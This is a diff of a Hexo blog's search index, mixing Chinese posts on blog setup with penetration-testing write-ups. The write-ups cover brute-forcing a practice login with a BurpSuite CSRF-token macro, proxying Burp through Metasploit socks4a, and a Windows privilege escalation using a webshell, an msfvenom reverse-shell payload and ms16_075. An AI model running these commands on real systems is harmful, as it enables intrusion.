class="comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class="line">    <span class="comment">// if not with index.html endpos = link.lastIndexOf(&#x27;.&#x27;) + 1 support hexo-abbrlink</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/.*\/index\.html$/</span>.test(link)) &#123;</span><br><span class="line">      <span class="comment">// when permalink is end with index.html, for example 2019/02/20/xxtitle/index.html</span></span><br><span class="line">      <span class="comment">// image in xxtitle/ will go to xxtitle/index/</span></span><br><span class="line">      appendLink = <span class="string">&#x27;index/&#x27;</span>;</span><br><span class="line">      <span class="keyword">var</span> endPos = link.lastIndexOf(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> endPos = link.length<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    link = link.substring(beginPos, endPos) + <span class="string">&#x27;/&#x27;</span> + appendLink;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toprocess = [<span class="string">&#x27;excerpt&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; toprocess.length; i++)&#123;</span><br><span class="line">      <span class="keyword">var</span> key = toprocess[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> $ = cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: <span class="literal">false</span>,</span><br><span class="line">        xmlMode: <span class="literal">false</span>,</span><br><span class="line">        lowerCaseTags: <span class="literal">false</span>,</span><br><span class="line">        decodeEntities: <span class="literal">false</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(<span class="string">&#x27;img&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>))&#123;</span><br><span class="line">          <span class="comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span></span><br><span class="line">          <span class="keyword">var</span> src = $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">          <span class="keyword">if</span>(!(<span class="regexp">/http[s]*.*|\/\/.*/</span>.test(src)</span><br><span class="line">            || <span class="regexp">/^\s+\//</span>.test(src)</span><br><span class="line">            || <span class="regexp">/^\s*\/uploads|images\//</span>.test(src))) &#123;</span><br><span class="line">            <span class="comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class="line">            <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">            <span class="keyword">var</span> linkArray = link.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">              <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">var</span> srcArray = src.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">              <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span>(srcArray.length &gt; <span class="number">1</span>)</span><br><span class="line">            srcArray.shift();</span><br><span class="line">            src = srcArray.join(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>, config.root + link + src);</span><br><span class="line">            <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;no src attr, skipped...&quot;</span>);</span><br><span class="line">          <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info($(<span class="built_in">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] = $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 <p>然后清除hexo缓存</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>
-
+<p>这样新建的文章会同时自动生成同文章名的文件夹</p>
+<p>平时我使用<code>vs code</code>写<code>markdown</code>文档，配合<code>Paste Image</code>插件，只需<code>Ctrl + Alt + V</code>可自动把剪切板的图片复制到同路径的<code>images</code>文件夹下，并在文章中生成图片链接。因hexo只能读取文章同路径下同文章名的文件夹下的文件，需要把<code>images</code>文件夹的所有图片复制到同文章名的文件夹下，然后在文章中把所有<code>images/</code>替换成空即可</p>
+<p><strong>示例：</strong></p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">MacGesture2-Publish</span></span><br><span class="line"><span class="string">├──</span> <span class="string">apppicker.jpg</span></span><br><span class="line"><span class="string">├──</span> <span class="string">logo.jpg</span></span><br><span class="line"><span class="string">└──</span> <span class="string">rules.jpg</span></span><br><span class="line"><span class="string">MacGesture2-Publish.md</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>![logo](logo.jpg)</code>来引入<code>logo.jpg</code></p>
 <h3 id="自动部署到github"><a href="#自动部署到github" class="headerlink" title="自动部署到github"></a>自动部署到github</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
 <p>然后需要在根路径的_config.yml配置你的git URL</p>
 <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/xxx/xxx.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
@@ -415,7 +415,7 @@
 <p>在主题配置文件中启用<code>fancybox</code>：</p>
 <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
 <p>参考：<a href="https://github.com/theme-next/theme-next-fancybox3">https://github.com/theme-next/theme-next-fancybox3</a></p>
-<h3 id="添加一个二次元人物"><a href="#添加一个二次元人物" class="headerlink" title="添加一个二次元人物"></a>添加一个二次元人物</h3><p>效果如下：<br><img data-src="hexo-blog/2020-08-21-18-23-16.png"><br>首先安装live2d插件：</p>
+<h3 id="添加一个二次元人物"><a href="#添加一个二次元人物" class="headerlink" title="添加一个二次元人物"></a>添加一个二次元人物</h3><p>效果如下：<br><img data-src="2020-08-21-18-23-16.png"><br>首先安装live2d插件：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure>
 <p>在Hexo的<code>_config.yml</code>文件中添加下面代码：</p>
 <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-wanko</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">react:</span></span><br><span class="line">    <span class="attr">opacity:</span> <span class="number">0.7</span></span><br></pre></td></tr></table></figure>
@@ -504,31 +504,46 @@
       </tags>
   </entry>
   <entry>
+    <title>同步GitHub Page博客到Gitee</title>
+    <url>/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/</url>
+    <content><![CDATA[<h3 id="Gitee-Page"><a href="#Gitee-Page" class="headerlink" title="Gitee Page"></a>Gitee Page</h3><p>码云 Pages是一个免费的静态网页托管服务，您可以使用 码云 Pages 托管博客、项目官网等静态网页。如果您使用过 Github Pages 那么您会很快上手使用码云的 Pages服务。<br>相对 Github Pages 来说，码云 Gitee Pages在国内访问会快很多。使用简单的方法就能让 Gitee Page 同步 Github Pages。</p>
+<a id="more"></a>
+<h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><p>在首页，选择新建仓库<br><img data-src="2020-08-21-16-52-22.png"><br>选择导入已有仓库，并修改仓库名称和路径为Gitee的用户名，因为我已经导入过了，所以这里显示重复<br><img data-src="2020-08-21-16-53-47.png"><br>导入后是这样子的<br><img data-src="2020-08-21-16-55-00.png"><br>在服务中启动Gitee Pages<br><img data-src="2020-08-21-16-55-24.png"><br>检查用户名和url是否对应，然后点击更新<br><img data-src="2020-08-21-16-55-53.png"><br>更新后即可通过页面的url访问到博客。</p>
+<h3 id="GitHub-Page更新"><a href="#GitHub-Page更新" class="headerlink" title="GitHub Page更新"></a>GitHub Page更新</h3><p>如果GitHub Page更新了，可以点击码云的同步按钮同步博客内容：<br><img data-src="2020-08-21-17-04-38.png"></p>
+]]></content>
+      <categories>
+        <category>折腾</category>
+      </categories>
+      <tags>
+        <tag>折腾</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用BurpSuite宏获取CSRF TOKEN</title>
     <url>/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/</url>
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在WEB渗透中经常可以看到页面存在一次性<code>token</code>校验的情况，即请求包中包含<code>token</code>，而<code>token</code>值需通过其它页面获取，导致<code>burpsuite</code>抓包后无法重放。</p>
-<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>下面以一个简单例子来做个说明。目标网站如下，页面存在一个图片验证码，题目要求暴力破解得到账号密码。这题可以有多种方式实现，这里以<code>burpsuite</code>宏进行实验。<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-55-39.png"></p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>下面以一个简单例子来做个说明。目标网站如下，页面存在一个图片验证码，题目要求暴力破解得到账号密码。这题可以有多种方式实现，这里以<code>burpsuite</code>宏进行实验。<br><img data-src="2020-08-19-18-55-39.png"></p>
 <a id="more"></a>
 <h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
-<li>目标URL为：<code>http://1.1.1.1/c/hdyzma/welcome.php</code>，抓个包测试一下，发现其会对<code>token</code>参数校验，拒绝重放的数据包。<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-17.png"><br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-24.png"></li>
-<li>在登陆页面<code>http://1.1.1.1/c/hdyzma/</code>可发现<code>token</code>值：<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-48.png"></li>
+<li>目标URL为：<code>http://1.1.1.1/c/hdyzma/welcome.php</code>，抓个包测试一下，发现其会对<code>token</code>参数校验，拒绝重放的数据包。<br><img data-src="2020-08-19-18-56-17.png"><br><img data-src="2020-08-19-18-56-24.png"></li>
+<li>在登陆页面<code>http://1.1.1.1/c/hdyzma/</code>可发现<code>token</code>值：<br><img data-src="2020-08-19-18-56-48.png"></li>
 <li>通过上面的发现，可以使用<code>burpsuite</code>的宏功能自动把登陆页的<code>token</code>值抓取出来填入登陆请求</li>
 </ol>
 <h3 id="创建Macros"><a href="#创建Macros" class="headerlink" title="创建Macros"></a>创建Macros</h3><ol>
-<li>创建<code>Macros</code>，获取<code>token</code>值<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-57-29.png"></li>
-<li>在<code>Macro Recorder</code>中选择包含要获取的<code>token</code>的页面<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-57-54.png"></li>
-<li>配置<code>Macros</code><br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-58-16.png"><br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-58-23.png"><br>用鼠标选中<code>token</code>值，<code>burpsuite</code>会自动填写开始标记以及结束标记，并且写上<code>Parameter name</code>为<code>token</code>，注意这里的参数名<code>token</code>是与要爆破页面里的<code>token</code>名称一致：<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-59-07.png"><br>定义<code>Macro</code>描述，方便区分：<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-59-30.png"></li>
+<li>创建<code>Macros</code>，获取<code>token</code>值<br><img data-src="2020-08-19-18-57-29.png"></li>
+<li>在<code>Macro Recorder</code>中选择包含要获取的<code>token</code>的页面<br><img data-src="2020-08-19-18-57-54.png"></li>
+<li>配置<code>Macros</code><br><img data-src="2020-08-19-18-58-16.png"><br><img data-src="2020-08-19-18-58-23.png"><br>用鼠标选中<code>token</code>值，<code>burpsuite</code>会自动填写开始标记以及结束标记，并且写上<code>Parameter name</code>为<code>token</code>，注意这里的参数名<code>token</code>是与要爆破页面里的<code>token</code>名称一致：<br><img data-src="2020-08-19-18-59-07.png"><br>定义<code>Macro</code>描述，方便区分：<br><img data-src="2020-08-19-18-59-30.png"></li>
 </ol>
 <h3 id="创建Session-Handling-Rules"><a href="#创建Session-Handling-Rules" class="headerlink" title="创建Session Handling Rules"></a>创建Session Handling Rules</h3><ol>
-<li><p>然后在Session Handling Rules里面新建一条规则：<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-00-45.png"><br>设置一个名字，这里叫<code>update_token</code>：<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-02.png"><br>选中刚刚录制好的宏，并且设置要更新的参数名，这里是<code>token</code>：<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-19.png"></p>
+<li><p>然后在Session Handling Rules里面新建一条规则：<br><img data-src="2020-08-19-19-00-45.png"><br>设置一个名字，这里叫<code>update_token</code>：<br><img data-src="2020-08-19-19-01-02.png"><br>选中刚刚录制好的宏，并且设置要更新的参数名，这里是<code>token</code>：<br><img data-src="2020-08-19-19-01-19.png"></p>
 </li>
-<li><p>然后是设置宏的影响范围，因为我们只需要暴力破解账号密码，所以<code>Tools Scope</code>这里只选中<code>Repeater</code>、<code>Intruder</code>就行了，其它模块可根据实际需要勾选:<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-52.png"></p>
+<li><p>然后是设置宏的影响范围，因为我们只需要暴力破解账号密码，所以<code>Tools Scope</code>这里只选中<code>Repeater</code>、<code>Intruder</code>就行了，其它模块可根据实际需要勾选:<br><img data-src="2020-08-19-19-01-52.png"></p>
 </li>
 </ol>
 <h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ol>
-<li>回到<code>Repeater</code>，点击<code>Go</code>重新发包，可以看到现在<code>token</code>参数会自动刷新：<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-29.png"><br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-36.png"></li>
-<li>使用<code>Intruder</code>暴力破解账号密码：<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-54.png"><br>因为多线程会同时刷新<code>token</code>，导致部分请求包拿到的<code>token</code>已经被刷新了，所以只能设置单线程跑：<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-03-17.png"><br>成功暴破得到账号<code>admin/123456a</code><br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-03-32.png"></li>
+<li>回到<code>Repeater</code>，点击<code>Go</code>重新发包，可以看到现在<code>token</code>参数会自动刷新：<br><img data-src="2020-08-19-19-02-29.png"><br><img data-src="2020-08-19-19-02-36.png"></li>
+<li>使用<code>Intruder</code>暴力破解账号密码：<br><img data-src="2020-08-19-19-02-54.png"><br>因为多线程会同时刷新<code>token</code>，导致部分请求包拿到的<code>token</code>已经被刷新了，所以只能设置单线程跑：<br><img data-src="2020-08-19-19-03-17.png"><br>成功暴破得到账号<code>admin/123456a</code><br><img data-src="2020-08-19-19-03-32.png"></li>
 </ol>
 <h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>源码来自<a href="https://github.com/3sNwgeek">3sNwgeek</a>，附上题目：<a href="https://github.com/3sNwgeek/BruteForc_test">https://github.com/3sNwgeek/BruteForc_test</a></p>
 ]]></content>
@@ -538,21 +553,6 @@
       <tags>
         <tag>渗透测试</tag>
         <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>同步GitHub Page博客到Gitee</title>
-    <url>/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/</url>
-    <content><![CDATA[<h3 id="Gitee-Page"><a href="#Gitee-Page" class="headerlink" title="Gitee Page"></a>Gitee Page</h3><p>码云 Pages是一个免费的静态网页托管服务，您可以使用 码云 Pages 托管博客、项目官网等静态网页。如果您使用过 Github Pages 那么您会很快上手使用码云的 Pages服务。<br>相对 Github Pages 来说，码云 Gitee Pages在国内访问会快很多。使用简单的方法就能让 Gitee Page 同步 Github Pages。</p>
-<a id="more"></a>
-<h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><p>在首页，选择新建仓库<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-52-22.png"><br>选择导入已有仓库，并修改仓库名称和路径为Gitee的用户名，因为我已经导入过了，所以这里显示重复<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-53-47.png"><br>导入后是这样子的<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-00.png"><br>在服务中启动Gitee Pages<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-24.png"><br>检查用户名和url是否对应，然后点击更新<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-53.png"><br>更新后即可通过页面的url访问到博客。</p>
-<h3 id="GitHub-Page更新"><a href="#GitHub-Page更新" class="headerlink" title="GitHub Page更新"></a>GitHub Page更新</h3><p>如果GitHub Page更新了，可以点击码云的同步按钮同步博客内容：<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-17-04-38.png"></p>
-]]></content>
-      <categories>
-        <category>折腾</category>
-      </categories>
-      <tags>
-        <tag>折腾</tag>
       </tags>
   </entry>
   <entry>
@@ -569,12 +569,84 @@
       </tags>
   </entry>
   <entry>
+    <title>让BurpSuite使用MSF的socks4a代理</title>
+    <url>/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在使用msf转发流量时遇到了个问题，就是使用auxiliary/server/socks4a做代理时，burpsuite不支持socks4a代理，导致无法使用burp去抓包。而使用auxiliary/server/socks5做代理却失败了，可能是脚本的bug，官方issues也有人反馈这个问题。</p>
+<h3 id="具体问题"><a href="#具体问题" class="headerlink" title="具体问题"></a>具体问题</h3><h4 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h4><p>我所在的环境比较特殊，工作机（192.168.1.2，Windows）位于A地内网，MSF机器（172.16.1.2，Linux）位于B地内网，两内网不相通，但是可以通过11.11.11.11:22 SSH访问MSF机器，遂用SSH隧道将172.16.1.2:11080端口转发到工作机的127.0.0.1:1083端口，如果不清楚这个操作，可以理解为工作机访问本机127.0.0.1:1083端口等价于访问MSF机172.16.1.2:11080端口。<br><img data-src="2020-08-19-18-43-50.png"></p>
+<a id="more"></a>
+<h4 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h4><ol>
+<li>在MSF机器启动socks4a代理（前面获取反弹shell、设置路由的步骤略过）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; use auxiliary&#x2F;server&#x2F;socks4a </span><br><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; set SRVPORT 11080</span><br><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; exploit</span><br></pre></td></tr></table></figure>
+<img data-src="2020-08-19-18-44-36.png"></li>
+<li>在配置代理前，我的ip地址是A地公网ip<br><img data-src="2020-08-19-18-44-49.png"></li>
+<li>使用Firefox配置代理测试转发是否正常，这时ip由联通变成电信了，证明代理转发隧道工作正常<br><img data-src="2020-08-19-18-45-05.png"><br><img data-src="2020-08-19-18-45-14.png"></li>
+<li>这个时候，如果直接在burpsuite配置前置socks代理的话是不能使用的，因为burpsuite不支持socks4协议，所以会打不开网页<br><img data-src="2020-08-19-18-45-33.png"></li>
+</ol>
+<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>使用sockscap64工具，把socks4a转发为http代理。当然，使用其它工具将socks4a转为http代理或socks5代理也行，比如Linux下的privoxy，socks4a转socks5的工具找了很久都没找到，遂放弃。</p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
+<li>打开sockscap64工具，创建代理配置，代理服务器为127.0.0.1:1083（MSF socks4a端口地址）<br><img data-src="2020-08-19-18-46-34.png"><br><img data-src="2020-08-19-18-46-39.png"><br><img data-src="2020-08-19-18-46-47.png"></li>
+<li>burpsuite配置前置http代理，代理服务地址为127.0.0.1:25378，这个端口是sockscap64监听的端口<br><img data-src="2020-08-19-18-47-08.png"><br><img data-src="2020-08-19-18-47-15.png"></li>
+<li>打开Firefox测试，可以看到现在已经是MSF机器的电信ip了，问题成功解决。<br><img data-src="2020-08-19-18-47-29.png"></li>
+<li>回顾下出口流量走向，如下：<div id="flowchart-0" class="flow-chart"></div>
+
+</li>
+</ol>
+<h4 id="为什么是25378端口"><a href="#为什么是25378端口" class="headerlink" title="为什么是25378端口"></a>为什么是25378端口</h4><ol>
+<li>SockScap64支持系统代理<br><img data-src="2020-08-19-18-50-11.png"></li>
+<li>启用系统代理可发现其使用25378端口做代理服务<br><img data-src="2020-08-19-18-50-27.png"><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 工作机Firefox
+e=>end: 目标网络
+op1=>operation: burp代理（127.0.0.1:1080)
+op2=>operation: SocksCap64本地代理（127.0.0.1:25378)
+op3=>operation: ssh本地转发端口（127.0.0.1:1083)
+op4=>operation: msf socks4a端口（172.16.1.2:11083）
+st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script></li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次Windows提权过程</title>
+    <url>/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img data-src="2020-08-19-18-10-21.png"></p>
+<h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </span><br></pre></td></tr></table></figure>
+
+<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp  </span><br><span class="line">set LHOST x.x.x.x  </span><br><span class="line">set LPORT xx  </span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="通过webshell上传并执行木马"><a href="#通过webshell上传并执行木马" class="headerlink" title="通过webshell上传并执行木马"></a>通过webshell上传并执行木马</h3><p><img data-src="2020-08-19-18-11-37.png"></p>
+<h3 id="msf接收到会话"><a href="#msf接收到会话" class="headerlink" title="msf接收到会话"></a>msf接收到会话</h3><p><img data-src="2020-08-19-18-12-59.png"></p>
+<h3 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid  </span><br></pre></td></tr></table></figure>
+<p><img data-src="2020-08-19-18-14-15.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use incognito   </span><br><span class="line">list_tokens -u  </span><br></pre></td></tr></table></figure>
+<p><img data-src="2020-08-19-18-19-47.png"></p>
+<h3 id="查找可利用的提权exp"><a href="#查找可利用的提权exp" class="headerlink" title="查找可利用的提权exp"></a>查找可利用的提权exp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester  </span><br></pre></td></tr></table></figure>
+<p><img data-src="2020-08-19-18-20-11.png"></p>
+<h3 id="把当前msf回话放到后台，并记住其session值为5"><a href="#把当前msf回话放到后台，并记住其session值为5" class="headerlink" title="把当前msf回话放到后台，并记住其session值为5"></a>把当前msf回话放到后台，并记住其session值为5</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bg  </span><br></pre></td></tr></table></figure>
+<p><img data-src="2020-08-19-18-20-36.png"></p>
+<h3 id="利用ms16-075得到system权限"><a href="#利用ms16-075得到system权限" class="headerlink" title="利用ms16_075得到system权限"></a>利用ms16_075得到system权限</h3><p><img data-src="2020-08-19-18-20-50.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
